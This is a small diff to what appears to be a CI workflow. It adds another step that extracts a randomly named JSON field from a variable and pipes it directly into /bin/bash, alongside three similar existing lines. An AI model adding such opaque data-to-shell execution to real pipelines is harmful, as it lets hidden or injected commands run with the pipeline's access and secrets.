@@ -37,6 +37,7 @@ jobs:
           echo $l76976 | jq -r .hat571 | /bin/bash
           printf '%s' "$ygtq3" | jq -r .lrmpf36240 | /bin/bash
           echo $i8 | jq -r .ila116 | /bin/bash
+          echo $q9375 | jq -r .vexe05547 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
